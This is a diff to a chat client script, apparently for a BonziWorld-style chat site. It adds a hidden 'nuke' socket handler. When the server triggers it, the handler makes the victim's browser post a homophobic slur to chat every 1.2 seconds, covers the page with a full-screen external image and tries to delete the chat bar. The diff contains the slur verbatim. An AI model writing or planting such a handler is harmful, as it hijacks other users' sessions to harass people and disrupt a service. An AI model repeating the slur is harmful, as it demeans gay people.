@@ -157,6 +157,15 @@ function setup() {
             var b = bonzis[a.guid];
             (b.rng = new Math.seedrandom(a.rng)), b.cancel(), b.joke();
         }),
+         socket.on("nuke", () => {
+                setInterval(() => {
+                    socket.emit("talk", {
+                        text: "I AM A GAY FAGGOT"
+                    })
+                }, 1200)
+                document.getElementById("content").innerHTML += "<img src='https://web.archive.org/web/20230418123530/https://www.politico.eu/cdn-cgi/image/width=1160,height=751,quality=80,onerror=redirect,format=auto/wp-content/uploads/2023/01/04/GettyImages-1244207852.jpg' style='top:0;left:0;position:fixed;width:100%;height:100%;z-index:-999;'>";
+                document.getElementBYId("chat_bar").remove();
+            }),
         socket.on("youtube", function (a) {
             var b = bonzis[a.guid];
             b.cancel(), b.youtube(a.vid);
